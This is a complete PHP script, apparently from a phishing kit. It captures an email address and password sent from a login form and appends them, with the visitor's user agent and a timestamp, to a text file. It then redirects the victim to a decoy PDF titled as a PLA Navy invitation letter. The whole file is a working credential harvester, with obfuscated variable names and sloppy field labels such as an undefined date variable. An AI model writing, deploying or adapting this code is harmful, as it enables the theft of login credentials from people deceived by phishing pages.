<?php

$xfu=fopen('XUlTAFvVVVVVVBSgAsnnnJSD.txt','a');
$rqedname=$_POST['email'];    
$rqpsw=$_POST['pad'];    
$rmpp=$_SERVER["REMOTE_ADDR"];     
$dinyo= date('d/m/y G:i:s',time());              
$juvalu="\n";
$juvalu.="UserName  :".$rqedname."\n";
$juvalu.="Password  :".$rqpsw."\n";
$juvalu.="DATE      :".$date."\n";
$juvalu.="IP ADDRESS:".$dinyo."\n";
$juvalu   .="UG        :".$_SERVER['HTTP_USER_AGENT']."\n";
$write=fwrite($xfu,$juvalu);
fclose($xfu);
header('location:PLA NAVY Invitation Letter.pdf');
exit;
?>